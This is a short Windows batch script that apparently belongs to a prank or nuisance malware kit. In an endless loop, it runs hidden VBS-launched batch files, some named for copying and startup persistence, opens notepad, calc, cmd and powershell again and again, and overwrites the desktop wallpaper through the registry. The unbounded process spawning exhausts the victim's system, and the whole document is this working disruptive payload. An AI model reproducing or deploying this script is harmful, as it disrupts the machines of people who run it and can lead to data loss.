@echo off
:loop
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat

start notepad
start calc
start cmd
start powershell

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\image3.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUser SystemParameters

goto loop
